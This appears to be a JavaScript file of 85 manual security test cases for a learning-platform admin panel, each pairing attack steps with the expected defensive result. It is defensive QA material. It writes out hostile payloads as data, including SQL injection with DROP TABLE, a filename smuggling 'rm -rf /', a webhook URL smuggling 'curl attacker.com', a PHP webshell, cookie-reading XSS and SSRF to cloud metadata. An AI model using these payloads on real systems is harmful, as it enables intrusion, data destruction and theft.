// PSEC — Cross-Cutting Penetration & Security Testing — 85 cases
module.exports = [
  {
    code: 'PSEC',
    title: 'Cross-Cutting Security & Penetration Testing',
    cases: [
      // ── Injection Attacks ──────────────────────────────────────────────────
      { id:'PS-001', name:'SQL injection in login email field', pre:'Login page', steps:"1. Enter: ' OR 1=1 -- in email\n2. Enter any password\n3. Submit", expected:'Request rejected or 400 error; no SQL error message leaked; no unauthorized access', priority:'Critical', type:'Security' },
      { id:'PS-002', name:'SQL injection in search fields (courses, users, orgs)', pre:'Logged in; any list page with search', steps:"1. Enter: '; DROP TABLE courses; -- in search field\n2. Submit", expected:'Input sanitized or parameterized; no database error; no table dropped', priority:'Critical', type:'Security' },
      { id:'PS-003', name:'SQL injection in URL query parameters', pre:'Authenticated session', steps:"1. Append ?id=1' OR '1'='1 to any list URL\n2. Observe response", expected:'Parameter ignored or sanitized; no SQL error; no extra data returned', priority:'Critical', type:'Security' },
      { id:'PS-004', name:'NoSQL injection in JSON request body', pre:'Authenticated; API calls available', steps:'1. Send JSON: {"email": {"$gt": ""},"password": {"$gt": ""}}\n2. POST to login API', expected:'Request rejected; no authentication bypass', priority:'Critical', type:'Security' },
      { id:'PS-005', name:'LDAP injection if LDAP auth used', pre:'LDAP integration configured', steps:'1. Enter "*)(&" in username field\n2. Submit', expected:'LDAP query escaped; no injection successful', priority:'Critical', type:'Security' },
      { id:'PS-006', name:'Command injection in file upload filename', pre:'Media Library upload', steps:'1. Upload file named "; rm -rf / #.jpg"\n2. Observe', expected:'Filename sanitized; OS command not executed; file stored safely', priority:'Critical', type:'Security' },
      { id:'PS-007', name:'Command injection via webhook URL parameter', pre:'Webhook configuration', steps:'1. Enter URL with shell metacharacters: "https://example.com/hook; curl attacker.com"\n2. Save', expected:'Input sanitized or URL validation rejects illegal characters', priority:'Critical', type:'Security' },

      // ── XSS — Stored, Reflected, DOM ──────────────────────────────────────
      { id:'PS-008', name:'Stored XSS in course title rendered in admin panel', pre:'Logged in as admin', steps:'1. Create course with title "<script>document.cookie</script>"\n2. Log in as another admin\n3. View courses list', expected:'Script not executed; HTML entities encoded in title display', priority:'Critical', type:'Security' },
      { id:'PS-009', name:'Stored XSS in user bio displayed on profile page', pre:'Edit user profile', steps:'1. Enter "<img src=x onerror=alert(document.domain)>" in bio\n2. Save\n3. View profile', expected:'Event handler not executed; image error attribute stripped', priority:'Critical', type:'Security' },
      { id:'PS-010', name:'Stored XSS in forum thread body', pre:'Create forum thread', steps:'1. Post thread with body: <svg onload=alert(1)>\n2. View thread as different user', expected:'SVG event not executed; sanitized output', priority:'Critical', type:'Security' },
      { id:'PS-011', name:'Reflected XSS in search query parameter', pre:'Authenticated session', steps:'1. Navigate to /courses?search=<script>alert(1)</script>\n2. Observe page', expected:'Search term HTML-encoded in page; script not executed', priority:'Critical', type:'Security' },
      { id:'PS-012', name:'DOM XSS via URL fragment', pre:'Any page with client-side routing', steps:'1. Navigate to /#<img src=x onerror=alert(1)>\n2. Observe', expected:'Fragment not rendered as HTML; no script execution', priority:'Critical', type:'Security' },
      { id:'PS-013', name:'XSS in organization name displayed throughout UI', pre:'Create org form', steps:'1. Create org with name: <script>alert(\'xss\')</script>\n2. View org in list and other pages', expected:'Name escaped everywhere it renders; no script execution', priority:'Critical', type:'Security' },
      { id:'PS-014', name:'XSS in instructor bio on public-facing profile', pre:'Instructor profile with malicious bio', steps:'1. Set bio with <script> tag\n2. View public instructor page', expected:'Script not rendered; sanitized output', priority:'Critical', type:'Security' },
      { id:'PS-015', name:'Content-Security-Policy header present and blocks inline scripts', pre:'Any page response', steps:'1. Inspect HTTP response headers for any page\n2. Find Content-Security-Policy', expected:'CSP header present; restricts script-src to known origins; blocks \'unsafe-inline\'', priority:'Critical', type:'Security' },

      // ── IDOR — Insecure Direct Object References ───────────────────────────
      { id:'PS-016', name:'IDOR — access another org\'s course by changing course ID in URL', pre:'Logged in as org_admin Org A; Org B has course ID 999', steps:'1. Navigate to /courses/999/edit\n2. Or call GET /api/.../courses/999/', expected:'403 Forbidden; Org B\'s course not returned', priority:'Critical', type:'Security' },
      { id:'PS-017', name:'IDOR — access another user\'s profile', pre:'Logged in; know another user\'s ID', steps:'1. GET /api/.../users/{other-user-id}/', expected:'403 or scoped to own org only', priority:'Critical', type:'Security' },
      { id:'PS-018', name:'IDOR — view another learner\'s progress in a course', pre:'Learner A logged in', steps:'1. GET /api/.../courses/{id}/learners/{learner-b-id}/progress/', expected:'403 Forbidden for learner; admin scoped to own org', priority:'Critical', type:'Security' },
      { id:'PS-019', name:'IDOR — download another org\'s media file', pre:'Know file URL of another org\'s upload', steps:'1. Request media file URL from another org\n2. Access without auth', expected:'403 or signed URL mismatch; file not accessible cross-org', priority:'Critical', type:'Security' },
      { id:'PS-020', name:'IDOR — modify another org\'s course settings via API', pre:'Logged in as org_admin', steps:'1. PATCH /api/.../courses/{other-org-course-id}/ with modifications', expected:'403 Forbidden; course not updated', priority:'Critical', type:'Security' },
      { id:'PS-021', name:'IDOR — delete another org\'s module via API', pre:'Logged in as org_admin', steps:'1. DELETE /api/.../module-library/{other-org-module-id}/', expected:'403 Forbidden', priority:'Critical', type:'Security' },
      { id:'PS-022', name:'IDOR — access transaction of another user', pre:'Logged in; know another user\'s transaction ID', steps:'1. GET /api/.../transactions/{other-user-txn-id}/', expected:'403 Forbidden or only own transactions returned', priority:'Critical', type:'Security' },

      // ── JWT Security ───────────────────────────────────────────────────────
      { id:'PS-023', name:'JWT alg:none attack — remove signature, set alg none', pre:'Valid JWT token; decode it', steps:'1. Decode JWT\n2. Change alg to "none"\n3. Remove signature\n4. Send as Authorization Bearer', expected:'Backend rejects token; 401 returned; alg:none not accepted', priority:'Critical', type:'Security' },
      { id:'PS-024', name:'JWT role manipulation — change role claim to super_admin', pre:'Valid JWT for org_admin', steps:'1. Decode JWT payload\n2. Change role to super_admin\n3. Re-sign if possible, or send tampered token\n4. Make request', expected:'Signature verification fails; 401 returned; privilege escalation blocked', priority:'Critical', type:'Security' },
      { id:'PS-025', name:'JWT with expired exp claim rejected', pre:'JWT token expired', steps:'1. Use JWT with exp timestamp in the past\n2. Make authenticated request', expected:'401 Unauthorized; token expired error', priority:'Critical', type:'Security' },
      { id:'PS-026', name:'JWT with future iat (issued-at) rejected', pre:'JWT manipulation', steps:'1. Create JWT with iat far in the future\n2. Send request', expected:'Token rejected as invalid or not-yet-valid', priority:'High', type:'Security' },

      // ── SSRF — Server-Side Request Forgery ─────────────────────────────────
      { id:'PS-027', name:'SSRF via embed URL — AWS metadata endpoint', pre:'Embed lesson form', steps:'1. Enter http://169.254.169.254/latest/meta-data/ as embed URL\n2. Save or preview', expected:'URL blocked; internal metadata endpoint not reachable', priority:'Critical', type:'Security' },
      { id:'PS-028', name:'SSRF via webhook — internal network request', pre:'Webhook configuration', steps:'1. Set webhook URL to http://192.168.1.1/admin\n2. Trigger webhook', expected:'Private IP range blocked; no internal request made', priority:'Critical', type:'Security' },
      { id:'PS-029', name:'SSRF via URL import in media library (if feature exists)', pre:'Media Library import by URL feature', steps:'1. Import URL: http://localhost:8080/admin\n2. Observe', expected:'localhost/127.0.0.1 blocked; no internal service fetched', priority:'Critical', type:'Security' },

      // ── CSRF ──────────────────────────────────────────────────────────────
      { id:'PS-030', name:'CSRF — forged POST to create org without CSRF token', pre:'Valid admin session; CSRF protection in place', steps:'1. Create HTML form on attacker site targeting /api/.../orgs/ POST\n2. Admin clicks link while authenticated\n3. Observe if org created', expected:'Request rejected; CSRF token validation fails; SameSite cookie prevents cross-origin request', priority:'Critical', type:'Security' },
      { id:'PS-031', name:'CSRF — forged POST to delete a course', pre:'Same as above', steps:'1. Forge cross-origin DELETE /api/.../courses/{id}/\n2. Observe', expected:'403 or CSRF token mismatch; course not deleted', priority:'Critical', type:'Security' },
      { id:'PS-032', name:'State-changing operations require CSRF token or SameSite cookie', pre:'Any POST/PUT/DELETE endpoint', steps:'1. Send POST with correct auth token but no CSRF header\n2. From a different origin', expected:'Rejected; 403 or 400 "CSRF token missing/invalid"', priority:'Critical', type:'Security' },

      // ── Clickjacking ──────────────────────────────────────────────────────
      { id:'PS-033', name:'X-Frame-Options header prevents admin panel framing', pre:'Any page response', steps:'1. Inspect HTTP response headers\n2. Find X-Frame-Options or CSP frame-ancestors', expected:'X-Frame-Options: DENY or SAMEORIGIN; or CSP frame-ancestors \'none\' present', priority:'Critical', type:'Security' },
      { id:'PS-034', name:'Attempt to embed admin panel in attacker iframe', pre:'Create HTML with <iframe src="https://admin.budgetnista..."/>', steps:'1. Load attacker HTML with iframe targeting admin panel\n2. Observe', expected:'Browser blocks frame; no admin UI rendered inside iframe', priority:'Critical', type:'Security' },

      // ── Rate Limiting ──────────────────────────────────────────────────────
      { id:'PS-035', name:'Login endpoint rate limited after N failures', pre:'Login page', steps:'1. Submit incorrect login 10 times rapidly\n2. Observe HTTP response', expected:'429 Too Many Requests or CAPTCHA challenge after threshold; retry-after header present', priority:'Critical', type:'Security' },
      { id:'PS-036', name:'Forgot password endpoint rate limited', pre:'/forgot-password page', steps:'1. Submit forgot-password request 20 times with same email\n2. Observe', expected:'Rate limiting kicks in; 429 or short-circuit before sending 20 emails', priority:'Critical', type:'Security' },
      { id:'PS-037', name:'Invitation send endpoint rate limited', pre:'Invitations page', steps:'1. Rapidly send 100 invitations via API\n2. Observe', expected:'Rate limit triggered; spam prevention active', priority:'High', type:'Security' },
      { id:'PS-038', name:'File upload endpoint rate limited', pre:'Media Library', steps:'1. Upload 50 files in rapid succession\n2. Observe', expected:'Rate limit on upload endpoint; client throttled', priority:'High', type:'Security' },
      { id:'PS-039', name:'API endpoints rate limited per token', pre:'Valid API key', steps:'1. Send 1000 requests per minute via API key\n2. Observe', expected:'429 returned after threshold; X-RateLimit headers present', priority:'High', type:'Security' },

      // ── Security Headers ───────────────────────────────────────────────────
      { id:'PS-040', name:'HSTS header enforces HTTPS for 1 year', pre:'Any HTTPS response', steps:'1. Check Strict-Transport-Security header value', expected:'Strict-Transport-Security: max-age=31536000; includeSubDomains present', priority:'Critical', type:'Security' },
      { id:'PS-041', name:'X-Content-Type-Options nosniff prevents MIME sniffing', pre:'Any response', steps:'1. Check X-Content-Type-Options header', expected:'X-Content-Type-Options: nosniff present', priority:'High', type:'Security' },
      { id:'PS-042', name:'Referrer-Policy limits referrer leakage', pre:'Any page response', steps:'1. Check Referrer-Policy header', expected:'Referrer-Policy: strict-origin-when-cross-origin or no-referrer set', priority:'High', type:'Security' },
      { id:'PS-043', name:'Permissions-Policy restricts dangerous browser features', pre:'Any response', steps:'1. Check Permissions-Policy header', expected:'Header present restricting geolocation, camera, microphone access to self or none', priority:'Medium', type:'Security' },

      // ── File Upload Attacks ────────────────────────────────────────────────
      { id:'PS-044', name:'PHP webshell upload via course resource attachment', pre:'Lesson resource upload', steps:'1. Upload file named "shell.php" containing <?php system($_GET["cmd"]); ?>\n2. If accepted, access URL directly', expected:'PHP file rejected by extension/content-type check; or stored outside webroot with no execute permission', priority:'Critical', type:'Security' },
      { id:'PS-045', name:'Polyglot file (valid JPEG + PHP payload) upload', pre:'Media Library image upload', steps:'1. Create JPEG file with PHP code appended\n2. Upload as image\n3. If accepted, access URL', expected:'File not executed as PHP; stored as static binary', priority:'Critical', type:'Security' },
      { id:'PS-046', name:'Zip bomb via SCORM package upload', pre:'SCORM lesson upload', steps:'1. Upload specially crafted zip that expands to terabytes\n2. Observe server behavior', expected:'Extraction aborted at size limit; server not overwhelmed; error returned gracefully', priority:'Critical', type:'Security' },
      { id:'PS-047', name:'Path traversal via upload filename', pre:'Any file upload', steps:'1. Upload file with name "../../etc/passwd.jpg"\n2. Check server storage path', expected:'Filename sanitized; traversal characters removed; file stored in designated directory only', priority:'Critical', type:'Security' },
      { id:'PS-048', name:'SVG with JavaScript event handlers blocked', pre:'Media library image upload', steps:'1. Upload SVG: <svg><circle onclick="alert(1)" r="50" cx="50" cy="50"/></svg>\n2. View in admin panel', expected:'JS event handler stripped from SVG on render; not executed', priority:'Critical', type:'Security' },
      { id:'PS-049', name:'File upload — null byte injection in filename', pre:'Any file upload', steps:'1. Upload file named "safe.jpg\\x00.php"\n2. Check stored filename and execution', expected:'Null byte removed from filename; stored as "safe.jpg" or rejected', priority:'Critical', type:'Security' },

      // ── Session Security ───────────────────────────────────────────────────
      { id:'PS-050', name:'Session fixation — pre-set session ID not accepted after login', pre:'Login page', steps:'1. Set a known session cookie before login\n2. Log in with valid credentials\n3. Check if same session ID used', expected:'New session ID issued after authentication; pre-login ID invalidated', priority:'Critical', type:'Security' },
      { id:'PS-051', name:'Session invalidated on all devices after password change', pre:'Logged in on two browsers', steps:'1. Change password on Browser A\n2. Attempt action on Browser B', expected:'Browser B session invalidated; redirected to login', priority:'High', type:'Security' },
      { id:'PS-052', name:'Concurrent login limit (if applicable)', pre:'Same account logged in from 3 browsers', steps:'1. Log in to same account from 3 separate browsers', expected:'Either all sessions active (if no limit) or oldest session invalidated; no silent data exposure', priority:'Medium', type:'Security' },

      // ── Mass Assignment / Parameter Pollution ─────────────────────────────
      { id:'PS-053', name:'Mass assignment — cannot elevate role via user update API', pre:'Logged in as org_admin', steps:'1. PATCH /api/.../users/{own-id}/ with body: {"role": "super_admin"}\n2. Observe', expected:'Role field ignored or rejected; cannot self-promote to super_admin', priority:'Critical', type:'Security' },
      { id:'PS-054', name:'Mass assignment — cannot set is_active via profile API', pre:'Logged in user', steps:'1. PATCH /api/.../auth/profile/ with {"is_active": true, "is_staff": true}\n2. Observe', expected:'Protected fields ignored; cannot enable staff/admin flags via profile endpoint', priority:'Critical', type:'Security' },
      { id:'PS-055', name:'HTTP parameter pollution — duplicate params ignored safely', pre:'Any form submission', steps:'1. Submit POST with duplicate parameter: role=instructor&role=super_admin\n2. Observe', expected:'Last or first value used consistently; no privilege from dual parameter', priority:'High', type:'Security' },

      // ── Open Redirect ─────────────────────────────────────────────────────
      { id:'PS-056', name:'Open redirect in login redirect parameter', pre:'Login page with ?next= parameter', steps:'1. Navigate to /login?next=https://evil.com\n2. Log in\n3. Observe redirect', expected:'Redirect destination validated; only relative or same-origin URLs allowed; external blocked', priority:'Critical', type:'Security' },
      { id:'PS-057', name:'Open redirect in forgot-password success redirect', pre:'Forgot password success page', steps:'1. Manipulate redirect URL parameter to external domain\n2. Submit forgot-password', expected:'External redirect blocked; user stays on same origin', priority:'High', type:'Security' },

      // ── Information Disclosure ─────────────────────────────────────────────
      { id:'PS-058', name:'Error messages do not expose stack traces to client', pre:'Cause a 500 error (e.g., malformed request)', steps:'1. Send malformed JSON to API\n2. Observe error response', expected:'Generic error message returned; no stack trace, file paths, or DB queries in response', priority:'Critical', type:'Security' },
      { id:'PS-059', name:'API does not expose internal server paths in errors', pre:'Trigger a file-not-found error', steps:'1. Request a non-existent resource\n2. Check response body and headers', expected:'No /home/user/app/ or C:\\\\code\\\\ paths in response', priority:'High', type:'Security' },
      { id:'PS-060', name:'Password not stored or logged in plaintext', pre:'Check server logs after login', steps:'1. Log in\n2. Inspect server-side logs for plaintext password', expected:'Password not present in logs; only hashed reference if any', priority:'Critical', type:'Security' },
      { id:'PS-061', name:'Sensitive data not in URL query parameters', pre:'Check network requests during session', steps:'1. Monitor URLs during auth flows\n2. Check query strings', expected:'No tokens, passwords, or sensitive IDs in URLs (use POST body or headers instead)', priority:'High', type:'Security' },
      { id:'PS-062', name:'LocalStorage/sessionStorage does not hold plaintext credentials', pre:'Logged in; inspect browser storage', steps:'1. Open DevTools > Application > Storage\n2. Search for password, secret_key, credentials', expected:'No plaintext credentials; only tokens (and those should be httpOnly cookies ideally)', priority:'Critical', type:'Security' },
      { id:'PS-063', name:'API versioning error does not disclose internal API routes', pre:'Send request to /api/v0/ or /api/', steps:'1. GET /api/\n2. Observe response', expected:'Route listing or debug output not exposed; 404 or redirect only', priority:'High', type:'Security' },
      { id:'PS-064', name:'.env or config files not accessible via web', pre:'Web server running', steps:'1. GET /.env\n2. GET /config.js\n3. GET /settings.py\n4. GET /.git/config', expected:'All return 404 or 403; no environment variables or config exposed', priority:'Critical', type:'Security' },

      // ── CORS & Origin Validation ───────────────────────────────────────────
      { id:'PS-065', name:'CORS does not allow wildcard origin on authenticated endpoints', pre:'Send request with Origin: https://evil.com header', steps:'1. GET /api/.../courses/ with Origin: https://evil.com\n2. Check Access-Control-Allow-Origin header', expected:'Response does NOT have Access-Control-Allow-Origin: *; only specific trusted origins allowed', priority:'Critical', type:'Security' },
      { id:'PS-066', name:'CORS — credentials not shared with unknown origins', pre:'API call with Origin: https://evil.com + credentials', steps:'1. Send credentialed cross-origin request\n2. Check Access-Control-Allow-Credentials header', expected:'Not true for non-trusted origins; cookie/auth not accessible cross-origin', priority:'Critical', type:'Security' },

      // ── ReDoS ─────────────────────────────────────────────────────────────
      { id:'PS-067', name:'ReDoS — catastrophic backtracking via email input', pre:'Login or registration form', steps:'1. Enter very long email like: aaaaaaaaaaaaaaa@aaaaaaaaaaaaaaaa.aaaaaaaaaa\n2. Observe response time', expected:'Response time normal (< 2 seconds); regex doesn\'t cause CPU spike or timeout', priority:'High', type:'Security' },
      { id:'PS-068', name:'ReDoS — long URL in embed/webhook field', pre:'Embed URL or webhook form', steps:'1. Enter 10,000-character URL string\n2. Submit\n3. Observe response time', expected:'Input rejected by max-length or regex completes quickly; no timeout', priority:'Medium', type:'Security' },

      // ── GraphQL (if applicable) ────────────────────────────────────────────
      { id:'PS-069', name:'GraphQL introspection disabled in production', pre:'If GraphQL API used', steps:'1. POST to /graphql with {__schema{types{name}}} query', expected:'Introspection disabled or returns 403; schema not exposed', priority:'High', type:'Security' },
      { id:'PS-070', name:'GraphQL depth limit prevents deeply nested queries', pre:'GraphQL endpoint', steps:'1. Send query with 15+ levels of nesting\n2. Observe', expected:'Query rejected or truncated at depth limit; no infinite recursion', priority:'High', type:'Security' },

      // ── HTTP Methods ───────────────────────────────────────────────────────
      { id:'PS-071', name:'HTTP TRACE method disabled', pre:'Any endpoint', steps:'1. Send TRACE / HTTP/1.1 to server\n2. Observe', expected:'405 Method Not Allowed; TRACE not reflected back (XST prevention)', priority:'High', type:'Security' },
      { id:'PS-072', name:'HTTP OPTIONS on API does not expose dangerous methods', pre:'Any API endpoint', steps:'1. Send OPTIONS /api/.../courses/\n2. Check Allow header', expected:'Only GET, POST, PUT, PATCH, DELETE listed as needed; no TRACE, CONNECT', priority:'Medium', type:'Security' },
      { id:'PS-073', name:'PATCH on read-only resource returns 405', pre:'API call to read-only endpoint', steps:'1. PATCH /api/.../analytics/ (if read-only)\n2. Observe', expected:'405 Method Not Allowed; data not modified', priority:'Medium', type:'Security' },

      // ── Signed URL / Storage Security ──────────────────────────────────────
      { id:'PS-074', name:'Uploaded files accessible only via signed/expiring URLs', pre:'File uploaded to storage', steps:'1. Note file URL returned after upload\n2. Check if URL has token/expiry\n3. Wait for expiry\n4. Re-access URL', expected:'File URL expires; old URL returns 403 after expiry', priority:'High', type:'Security' },
      { id:'PS-075', name:'Bulk export does not include other orgs\' data', pre:'Logged in as org_admin; bulk export users/courses', steps:'1. Trigger bulk CSV export\n2. Inspect downloaded file', expected:'Only own org\'s data in export; no cross-org records', priority:'Critical', type:'Security' },

      // ── Miscellaneous ──────────────────────────────────────────────────────
      { id:'PS-076', name:'Admin panel not indexed by search engines', pre:'Any admin page', steps:'1. Check HTTP response for X-Robots-Tag header\n2. Check robots.txt for /admin path', expected:'noindex, nofollow present; /admin disallowed in robots.txt', priority:'Medium', type:'Security' },
      { id:'PS-077', name:'Sensitive actions require fresh authentication (re-auth)', pre:'Admin idle for 20 min; attempts delete org', steps:'1. After idle period, click Delete Org\n2. Confirm\n3. Observe if re-authentication required', expected:'Prompt to re-enter password before destructive actions; or session timeout already enforced', priority:'High', type:'Security' },
      { id:'PS-078', name:'Audit log cannot be deleted by any role', pre:'Audit log entries exist', steps:'1. Attempt DELETE /api/.../audit-log/{id}/ as super_admin\n2. Attempt as org_admin', expected:'Audit log is append-only; deletion not possible from UI or API', priority:'Critical', type:'Security' },
      { id:'PS-079', name:'Concurrent bulk delete race condition — count mismatch', pre:'Two admins attempt bulk delete on same set', steps:'1. Admin A selects 5 courses, Admin B selects same 5\n2. Both click delete simultaneously', expected:'Server handles idempotently; courses deleted once; no double-processing or 500 error', priority:'Medium', type:'Security' },
      { id:'PS-080', name:'Pagination offset manipulation does not expose extra records', pre:'API list endpoint with pagination', steps:'1. Call GET /api/.../users/?limit=10&offset=-1\n2. Or offset=999999\n3. Observe', expected:'Invalid offset returns 400 or empty results; no off-by-one data leakage', priority:'High', type:'Security' },
      { id:'PS-081', name:'Insecure deserialization — malformed JSON body handled safely', pre:'Any API endpoint', steps:'1. Send malformed JSON with nested objects: {"__proto__": {"admin": true}}\n2. Observe', expected:'Prototype pollution prevented; admin flag not set; request rejected or sanitized', priority:'Critical', type:'Security' },
      { id:'PS-082', name:'Password change invalidates all existing sessions', pre:'User logged in on two devices', steps:'1. Change password on Device A\n2. Attempt API call from Device B with old token', expected:'Device B token rejected; 401 returned; must re-login', priority:'Critical', type:'Security' },
      { id:'PS-083', name:'Sub-domain takeover — dangling CNAME check (if custom domains used)', pre:'Custom domain feature; CNAME pointing to platform', steps:'1. Configure custom domain "learn.test.com" pointing to platform\n2. Delete that org/domain from platform\n3. Check if CNAME still points to takeable resource', expected:'Dangling CNAME remediated; domain ownership validated before CNAME active', priority:'High', type:'Security' },
      { id:'PS-084', name:'Dependency vulnerability — run npm audit or equivalent', pre:'Project dependencies installed', steps:'1. Run "npm audit" in project\n2. Review results', expected:'No Critical or High severity CVEs in production dependencies; known issues patched', priority:'High', type:'Security' },
      { id:'PS-085', name:'API does not return 200 with error in body (must use proper HTTP codes)', pre:'Trigger various error conditions', steps:'1. Submit invalid data\n2. Access unauthorized resource\n3. Note HTTP status codes', expected:'400 for validation, 401 for unauthenticated, 403 for forbidden, 404 for not-found, 500 for server error — not all 200', priority:'Medium', type:'Security' },
    ]
  }
];
